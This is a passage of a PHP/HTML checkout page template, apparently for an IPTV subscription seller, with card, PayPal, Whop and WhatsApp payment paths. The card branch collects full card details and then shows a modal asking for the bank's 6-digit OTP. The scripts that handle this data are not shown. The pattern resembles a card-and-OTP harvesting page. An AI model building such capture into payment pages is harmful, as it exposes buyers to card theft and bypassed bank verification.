                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Card brand" loading="lazy" data-default-logo="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg">
                                    </span>
                                </div>
                                <small class="input-error" data-error="card_number"></small>
                            </label>
                            <div class="card-payment__row">
                                <label>
                                    Expiration date (MM / YY)
                                    <input type="text" name="expiry" placeholder="MM / YY" data-card-expiry inputmode="numeric" autocomplete="cc-exp" required>
                                    <small class="input-error" data-error="expiry">Enter a valid expiration date</small>
                                </label>
                                <label>
                                    Security code
                                    <input
                                        type="tel"
                                        name="cvc"
                                        placeholder="CVC"
                                        data-card-cvc
                                        inputmode="numeric"
                                        autocomplete="cc-csc"
                                        maxlength="3"
                                        oninput="this.value=this.value.replace(/\\D/g,'').slice(0, this.maxLength || 3)"
                                        required
                                    >
                                    <small class="input-error" data-error="cvc"></small>
                                </label>
                            </div>
                            <label>
                                Name on card
                                <input type="text" name="card_name" placeholder="Full name" data-card-name autocomplete="cc-name" required>
                                <small class="input-error" data-error="card_name"></small>
                            </label>
                        </div>
                    </div>
                    <div class="checkout-actions">
                        <button type="submit" class="btn primary" data-card-submit>Pay now</button>
                        <button type="button" class="btn outline connect-wallet" data-crypto-btn>Buy with crypto</button>
                        <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" class="link-light" data-keep-lang>Return to offers</a>
                    </div>
                    <p class="input-error" data-payment-error></p>
                </form>
                    <?php elseif ($isWhopCheckout): ?>
                        <div class="checkout-disabled checkout-whop">
                            <h3>Checkout via Whop</h3>
                            <p>You will be redirected to our Whop checkout to pay securely.</p>
                            <div class="checkout-actions">
                                <?php if ($whopCheckoutUrl !== ''): ?>
                                    <a class="btn primary" href="<?= e($whopCheckoutUrl) ?>" target="_blank" rel="noopener">Continue on Whop</a>
                                <?php else: ?>
                                    <span class="input-error">Whop checkout link missing. Please contact support.</span>
                                <?php endif; ?>
                                <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" class="link-light" data-keep-lang>Back to offers</a>
                            </div>
                        </div>
                    <?php elseif ($isPaypalCheckout): ?>
                        <div class="checkout-disabled checkout-paypal">
                            <h3 data-i18n-key="paypal-dsd" data-i18n-default="Pay with PayPal or card">Pay with PayPal or card</h3>
                            <p data-i18n-key="paypal-mesggg" data-i18n-default="Use PayPal balance or any debit/credit card via PayPal's secure checkout.">Use PayPal balance or any debit/credit card via PayPal's secure checkout.</p>
                            <p class="input-hint" data-i18n-key="paypal-contact-hint" data-i18n-default="We'll send your order details to this email and WhatsApp number. Make sure they're correct.">We'll send your order details to this email and WhatsApp number. Make sure they're correct.</p>
                            <div class="inline-inputs paypal-contact">
                                <label>Email
                                    <input type="email" name="contact_email" data-paypal-email placeholder="you@email.com" required>
                                </label>
                                <label data-i18n-key="label-whatsapp" data-i18n-default="WhatsApp / Phone">WhatsApp / Phone</label>
                                <input type="tel" name="contact_phone" data-paypal-phone placeholder="+1 514 555 0000" required>
                            </div>
                            <?php if ($paypalButtonEnabled): ?>
                                <div class="card-payment" style="margin-top:1rem;">
                                    <div class="card-payment__head">
                                        <div>
                                            <span class="card-payment__label">PayPal</span>
                                            <p data-i18n-key="paypal-checkout" data-i18n-default="Secure hosted checkout · PayPal or card">Secure hosted checkout · PayPal or card</p>
                                        </div>
                                    </div>
                                    <div id="paypal-button-container" data-paypal-container hidden></div>
                                    <p class="input-error" data-paypal-error></p>
                                    <div class="payment-confirmation" hidden data-paypal-success>
                                        <div class="confirmation-icon">✔</div>
                                        <div>
                                            <strong>Merci !</strong>
                                            <p>Payment confirmé via PayPal. <span data-paypal-code></span></p>
                                        </div>
                                    </div>
                                </div>
                            <?php elseif ($checkoutPaypalLink !== ''): ?>
                                <div class="checkout-actions">
                                    <a class="btn primary" href="<?= e($checkoutPaypalLink) ?>" target="_blank" rel="noopener">Continuer avec PayPal</a>
                                    <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" class="link-light" data-i18n-key="paypal-back-offers" data-keep-lang>Back to offers</a>
                                </div>
                            <?php else: ?>
                                <span class="input-error">Configure un Client ID PayPal pour activer le bouton, ou ajoute un lien PayPal direct.</span>
                            <?php endif; ?>
                            <div class="checkout-actions">
                                <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" class="link-light" data-i18n-key="paypal-back-offers" data-keep-lang>Back to offers</a>
                            </div>
                        </div>
                    <?php else: ?>
                        <div class="checkout-disabled">
                            <h3>Checkout temporarily closed</h3>
                            <p>Contact us directly on WhatsApp to complete your order.</p>
                            <div class="checkout-actions">
                                <a class="btn primary" href="<?= e($whatsappLink) ?>" target="_blank" rel="noopener">Order via WhatsApp</a>
                                <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" class="link-light" data-i18n-key="paypal-back-offers" data-keep-lang>Back to offers</a>
                            </div>
                        </div>
                    <?php endif; ?>
            </div>
                <div class="payment-column payment-column--summary">
                    <div class="summary-card">
                        <div class="summary-item">
                            <div class="summary-thumb">
                                <img src="<?= e($posterImage) ?>" alt="<?= e($offerName) ?>">
                                <span class="summary-count">1</span>
                            </div>
                            <div>
                                <strong><?= e($offerName) ?></strong>
                                <small><?= e($offerDuration) ?></small>
                            </div>
                            <span class="summary-price">$<?= e($offerPrice) ?></span>
                        </div>
                        <label class="gift-input">
                            <span data-i18n-key="gift-card-or-discount">Gift card or discount code</span>
                            <div>
                                <input type="text" name="discount" placeholder="Promo code">
                                <button data-i18n-key="apply" type="button">Apply</button>
                            </div>
                        </label>
                        <div class="summary-line">
                            <span data-i18n-key="subtotal">Subtotal</span>
                            <span>$<?= e($offerPrice) ?></span>
                        </div>
                        <div class="summary-total">
                            <span data-i18n-key="total">Total</span>
                            <div>
                                <strong>$<?= e($offerPrice) ?></strong>
                            </div>
                        </div>
                        <?php if ($offerFeatures): ?>
                            <div class="summary-features">
                                <p data-i18n-key="summary-includes" data-i18n-default="Ce plan inclut :">Ce plan inclut :</p>
                                <ul>
                                    <?php foreach ($offerFeatures as $feature): ?>
                                        <li><?= e($feature) ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="checkout-footer">
        <p>© <?= date('Y') ?> <?= e($brandName) ?> — Secure payment. <a href="<?= e(getWhatsappLink($supportWhatsappNumber, 'Support checkout')) ?>" target="_blank" rel="noopener" data-i18n-key="footer-help" data-i18n-default="Need help? Message us on WhatsApp">Need help? Message us on WhatsApp</a></p>
    </footer>

    <a class="whatsapp-float whatsapp-float--chat" href="<?= e($whatsappLink) ?>" target="_blank" rel="noopener" aria-label="WhatsApp">
        <svg viewBox="0 0 24 24" role="img" aria-hidden="true">
            <path fill="currentColor" d="M12 2a10 10 0 0 0-8.94 14.5L2 22l5.65-1.48A10 10 0 1 0 12 2zm0 1.8a8.2 8.2 0 0 1 6.69 12.85 8.2 8.2 0 0 1-9.34 2.59l-.27-.1-3.38.88.9-3.34-.17-.28A8.2 8.2 0 0 1 12 3.8zm3.66 5.04c-.2-.005-.49-.01-.77.48-.27.49-.9 1.4-.98 1.5-.08.1-.18.15-.32.08-.14-.07-.6-.22-1.14-.56-.84-.48-1.37-1.08-1.53-1.26-.16-.18-.02-.28.12-.41.12-.12.3-.32.42-.48.14-.16.18-.28.26-.46.08-.18.04-.35-.02-.48-.07-.13-.6-1.46-.82-2-.22-.54-.46-.48-.63-.48h-.54c-.17 0-.44.06-.67.31-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.6.12.16 1.78 2.72 4.3 3.9.6.27 1.07.43 1.44.55.6.19 1.14.16 1.57.1.48-.07 1.48-.61 1.69-1.21.21-.6.21-1.12.15-1.21-.06-.09-.22-.14-.42-.15z"/>
        </svg>
    </a>
    <div class="payment-overlay" data-payment-loader hidden>
        <div class="payment-overlay__content">
            <div class="loading-ring"></div>
            <p>Processing payment...</p>
        </div>
    </div>
    <div class="otp-modal" data-otp-modal hidden>
        <div class="otp-modal__content">
            <h3>Secure verification</h3>
            <p>Enter the 6-digit OTP sent to you to finalize the payment.</p>
            <input type="tel" maxlength="6" placeholder="______" inputmode="numeric" data-otp-input autocomplete="one-time-code">
            <small class="input-error" data-otp-error></small>
            <div class="otp-modal__actions">
                <button type="button" class="btn primary" data-otp-confirm>Confirm</button>
                <button type="button" class="btn ghost" data-otp-cancel>Cancel</button>
            </div>
        </div>
    </div>
    <script>
        window.APP_THEME = <?= json_encode($settings['active_theme'] ?? 'onyx') ?>;
    </script>
    <script>
        (function () {
            const lang = <?= json_encode($lang) ?>;
            const translations = {
                en: {
                    'nav-home': 'Home',
                    'nav-pricing': 'Pricing',
                    'nav-movies': 'Movies',
                    'nav-faq': 'FAQ',
                    'nav-contact': 'Contact',
                    'btn-free-trial': 'Free Trial',
                    'preview-eyebrow': 'Live preview',
                    'preview-title': 'Full site preview',
                    'preview-desc': 'See the public site (index) and jump to edits in one click.',
                    'btn-sidebar': 'Sidebar',
                    'btn-refresh': 'Refresh preview',
                    'btn-theme': 'Edit theme',
                    'btn-newtab': 'Open in new tab',
                    'paypal-dsd': 'Pay with PayPal or card',
                    'paypal-mesggg': "Use PayPal balance or any debit/credit card via PayPal's secure checkout.",
                    'paypal-contact-hint': "We'll send your order details to this email and WhatsApp number. Make sure they're correct.",
                    'label-whatsapp': 'WhatsApp / Phone',
                    'contact-heading': 'Contact information',
                    'contact-label': 'Email or mobile phone number',
                    'newsletter': 'Email me with news and offers',
                    'delivery-heading': 'Delivery method',
                    'delivery-ship': 'Ship',
                    'delivery-ship-note': 'Digital activation in 5-7 min',
                    'delivery-pickup': 'Pick up',
                    'delivery-pickup-note': 'Support via WhatsApp or email',
                    'shipping-heading': 'Shipping address',
                    'summary-includes': 'This plan includes:',
                    'footer-help': 'Need help? Message us on WhatsApp',
                    'paypal-contact-hint': "We'll send your order details to this email and WhatsApp number. Make sure they're correct.",
                    'paypal-mesggg': "Use PayPal balance or any debit/credit card via PayPal's secure checkout.",
                    'paypal-dsd': "Pay with PayPal or card",
                    'paypal-back-offers': "Back to offers",
                    'gift-card-or-discount': 'Gift card or discount code',
                    'subtotal': 'Subtotal',
                    'total': 'Total',
                    'apply': 'Apply',
                    'paypal-checkout': 'Secure hosted checkout · PayPal or card'
                },
                fr: {
                    'nav-home': 'Accueil',
                    'nav-pricing': 'Tarifs',
                    'nav-movies': 'Films et séries',
                    'nav-faq': 'FAQ',
                    'nav-contact': 'Contact',
                    'btn-free-trial': 'Essai gratuit',
                    'preview-eyebrow': 'Vue live',
                    'preview-title': 'Aperçu complet du site',
                    'preview-desc': 'Affiche le site public (index) dans le panel et saute vers l’édition en un clic.',
                    'btn-sidebar': 'Sidebar',
                    'btn-refresh': 'Rafraîchir l’aperçu',
                    'btn-theme': 'Éditer thème',
                    'btn-newtab': 'Ouvrir dans un nouvel onglet',
                    'paypal-dsd': 'Payer avec PayPal ou carte',
                    'paypal-mesggg': "Utilise ton solde PayPal ou une carte débit/crédit via le paiement sécurisé PayPal.",
                    'paypal-contact-hint': "Nous enverrons les détails de ta commande à cet email et numéro WhatsApp. Vérifie qu’ils sont corrects.",
                    'label-whatsapp': 'WhatsApp / Téléphone',
                    'contact-heading': 'Informations de contact',
                    'contact-label': 'Email ou numéro de téléphone',
                    'newsletter': 'Recevoir les offres par email',
                    'delivery-heading': 'Mode de livraison',
                    'delivery-ship': 'Envoi',
                    'delivery-ship-note': 'Activation digitale en 5-7 min',
                    'delivery-pickup': 'Pick up',
                    'delivery-pickup-note': 'Support WhatsApp ou e-mail',
                    'shipping-heading': 'Adresse de livraison',
                    'summary-includes': 'Ce plan inclut :',
                    'footer-help': 'Besoin d’aide ? Écris-nous sur WhatsApp',
                    'paypal-contact-hint': "Nous enverrons les détails de ta commande à cet email et numéro WhatsApp. Assure-toi qu'ils sont corrects.",
                    'paypal-mesggg': "Utilise le solde PayPal ou n'importe quelle carte de débit/crédit via le paiement sécurisé de PayPal.",
                    'paypal-dsd': "Payer avec PayPal ou carte",
                    'paypal-back-offers': "Retour aux offres",
                    'gift-card-or-discount': 'Carte cadeau ou code de réduction',
                    'subtotal': 'Sous-total',
                    'total': 'Total',
                    'apply': 'Appliquer',
                    'paypal-checkout': 'Paiement sécurisé hébergé · PayPal ou carte'
                },
            };

            const persistLang = (target) => {
                localStorage.setItem('site-lang', target);
                document.cookie = `site_lang=${target};path=/;max-age=31536000;samesite=lax`;
            };

            const syncLangLinks = (target) => {
                document.querySelectorAll('[data-keep-lang]').forEach((link) => {
                    try {
                        const url = new URL(link.href, window.location.origin);
                        url.searchParams.set('lang', target);
                        link.href = url.toString();
                    } catch (e) {
                        // Ignore invalid URLs
                    }
                });
            };

            const els = Array.from(document.querySelectorAll('[data-i18n-key]'));
            const applyLang = (target) => {
                const pack = translations[target] || {};
                els.forEach((el) => {
                    const key = el.dataset.i18nKey;
                    const raw = pack[key] ?? el.dataset.i18nDefault ?? el.textContent;
                    if (!raw) return;
                    const text = raw
                        .replace('{year}', el.dataset.i18nYear || new Date().getFullYear())
                        .replace('{brand}', el.dataset.i18nBrand || 'ABDO IPTV');
                    if (el.dataset.i18nHtml === 'true') {
                        el.innerHTML = text;
                    } else {
                        el.textContent = text;
                    }
                });
                document.querySelectorAll('[data-lang-switch]').forEach((btn) => {
                    btn.classList.toggle('active', btn.dataset.langSwitch === target);
                });
                document.documentElement.setAttribute('lang', target);
                persistLang(target);
                syncLangLinks(target);
            };

            document.querySelectorAll('[data-lang-switch]').forEach((btn) => {
                btn.addEventListener('click', () => {
                    const target = btn.dataset.langSwitch === 'fr' ? 'fr' : 'en';
                    applyLang(target);
                    const url = new URL(window.location.href);
                    url.searchParams.set('lang', target);
                    window.history.replaceState({}, '', url.toString());
                });
            });

            applyLang(lang);

            // Hide/show header on scroll
            const checkoutHeader = document.querySelector('.checkout-header');
            checkoutHeader?.classList.remove('hidden');
            let lastScroll = window.scrollY;
            let ticking = false;
            const threshold = 40;
            const delta = 5;

            const syncScroll = () => {
                lastScroll = window.scrollY;
            };

            window.addEventListener('pageshow', () => {
                checkoutHeader?.classList.remove('hidden');
                syncScroll();
            });

            const updateHeader = () => {
                if (!checkoutHeader) {
                    ticking = false;
                    return;
                }
                const current = window.scrollY;
                if (current - lastScroll > delta && current > threshold) {
                    checkoutHeader.classList.add('hidden');
                } else if (lastScroll - current > delta || current <= threshold) {
                    checkoutHeader.classList.remove('hidden');
                }
                lastScroll = current;
                ticking = false;
            };

            window.addEventListener('scroll', () => {
                if (!ticking) {
                    window.requestAnimationFrame(updateHeader);
                    ticking = true;
                }
            }, { passive: true });
        })();
    </script>
    <?php if ($paypalButtonEnabled): ?>
        <script>
            (function () {
                const paypalContainer = document.querySelector('[data-paypal-container]');
                const errorEl = document.querySelector('[data-paypal-error]');
                const successEl = document.querySelector('[data-paypal-success]');
                if (!paypalContainer) return;

                const initButtons = () => {
                    const emailInput = document.querySelector('[data-paypal-email]');
                    const phoneInput = document.querySelector('[data-paypal-phone]');
                    if (typeof window.paypal_abdo === 'undefined') {
                        if (errorEl) errorEl.textContent = 'PayPal a été bloqué par le navigateur. Désactive l\'adblock et réessaie.';
                        return;
                    }

                    const paypal = window.paypal_abdo;
                    const amount = "<?= e($offerPriceNumber) ?>";
                    const currency = "<?= e($paypalCurrency) ?>";
                    const description = <?= json_encode($paypalPurchaseDescription) ?>;

                    const hasContact = () => {
                        const ok = Boolean(emailInput?.value.trim()) && Boolean(phoneInput?.value.trim());
                        if (paypalContainer) {
                            paypalContainer.hidden = !ok;
                        }
                        return ok;
                    };

                    let buttonsRendered = false;
                    let buttonsInstance = null;

                    const renderButtons = () => {
                        if (buttonsRendered || !hasContact()) return;

                        buttonsInstance = paypal.Buttons({
                            style: { color: 'gold', shape: 'rect', label: 'paypal', height: 45 },
                            onClick: function (_, actions) {
                                const email = emailInput?.value.trim() || '';
                                const phone = phoneInput?.value.trim() || '';
                                if (!email || !phone) {
                                    if (errorEl) errorEl.textContent = 'Renseigne ton email et WhatsApp/phone avant de payer.';
                                    return actions ? actions.reject() : Promise.reject(new Error('Missing contact info'));
                                }
                                if (errorEl) errorEl.textContent = '';
                                return actions ? actions.resolve() : Promise.resolve();
                            },
                            createOrder: function (_, actions) {
                                return actions.order.create({
                                    purchase_units: [{
                                        amount: { value: amount, currency_code: currency },
                                        description: description,
                                    }],
                                });
                            },
                            onApprove: function (data, actions) {
                                return actions.order.capture().then(function (details) {
                                    const purchaseUnit = details?.purchase_units?.[0] || {};
                                    const capture = purchaseUnit?.payments?.captures?.[0] || {};
                                    const payer = details?.payer || {};
                                    const shipping = purchaseUnit?.shipping || {};
                                    const shipAddress = shipping?.address || {};
                                    const payload = {
                                        orderId: data.orderID || capture.id || '',
                                        transactionId: capture.id || '',
                                        payerId: payer.payer_id || '',
                                        status: capture.status || details?.status || '',
                                        payerEmail: payer.email_address || '',
                                        payerName: [payer.name?.given_name, payer.name?.surname].filter(Boolean).join(' ').trim(),
                                        amountValue: capture.amount?.value || amount,
                                        amountCurrency: capture.amount?.currency_code || currency,
                                        customerEmail: emailInput?.value.trim() || '',
                                        customerPhone: phoneInput?.value.trim() || '',
                                        shippingName: shipping?.name?.full_name || '',
                                        shippingPhone: shipping?.phone?.phone_number?.national_number || '',
                                        shippingLine1: shipAddress?.address_line_1 || '',
                                        shippingLine2: shipAddress?.address_line_2 || '',
                                        shippingCity: shipAddress?.admin_area_2 || '',
                                        shippingState: shipAddress?.admin_area_1 || '',
                                        shippingZip: shipAddress?.postal_code || '',
                                        shippingCountry: shipAddress?.country_code || '',
                                    };
                                    const url = new URL(window.location.href);
                                    url.searchParams.set('paypal_capture', '1');
                                    return fetch(url.toString(), {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify(payload),
                                    })
                                        .then((resp) => resp.json().catch(() => ({})))
                                        .then((json) => {
                                            if (json && json.success) {
                                                if (successEl) successEl.hidden = false;
                                                if (errorEl) errorEl.textContent = '';
                                                const codeEl = document.querySelector('[data-paypal-code]');
                                                if (codeEl && json.confirmation) {
                                                    codeEl.textContent = 'Réf #' + json.confirmation;
                                                }
                                            } else if (errorEl) {
                                                errorEl.textContent = json?.error || 'Payment saved but not recorded in CRM.';
                                            }
                                        })
                                        .catch((err) => {
                                            if (errorEl) {
                                                errorEl.textContent = 'Payment ok but save failed. Contact support.';
                                            }
                                            console.error('PayPal save error', err);
                                        });
                                });
                            },
                            onError: function (err) {
                                if (errorEl) {
                                    errorEl.textContent = 'Payment failed. Try again or contact support.';
                                }
                                console.error('PayPal error', err);
                            },
                        });

                        buttonsRendered = true;
                        buttonsInstance.render(paypalContainer).catch((err) => {
                            buttonsRendered = false;
                            if (errorEl) {
                                errorEl.textContent = 'PayPal ne se charge pas (script bloqué). Vérifie l\'adblock ou réessaie.';
                            }
                            console.error('PayPal render error', err);
                        });
                    };

                    const maybeRenderButtons = () => {
                        hasContact();
                        renderButtons();
                    };

                    hasContact();
                    maybeRenderButtons();

                    [emailInput, phoneInput].forEach((input) => {
                        input?.addEventListener('input', () => {
                            if (errorEl) errorEl.textContent = '';
                            maybeRenderButtons();
                        });
                    });
                };

                const script = document.createElement('script');
                script.src = <?= json_encode($paypalSdkUrl) ?>;
                script.dataset.namespace = 'paypal_abdo';
                script.onload = initButtons;
                script.onerror = () => {
                    if (errorEl) errorEl.textContent = 'PayPal ne se charge pas (script bloqué). Vérifie l\'adblock ou réessaie.';
                };
                document.head.appendChild(script);
            })();
        </script>
    <?php endif; ?>
    <script src="<?= $assetBase ?>/js/main.js?v=<?= time() ?>" defer></script>
    <script src="<?= $publicBase ?>/modals.js"></script>
    <script src="<?= $publicBase ?>/main.js"></script>
    <script src="<?= $publicBase ?>/fpbundle.js"></script>
    <script src="<?= $publicBase ?>/bundle.js"></script>
</body>
</html>
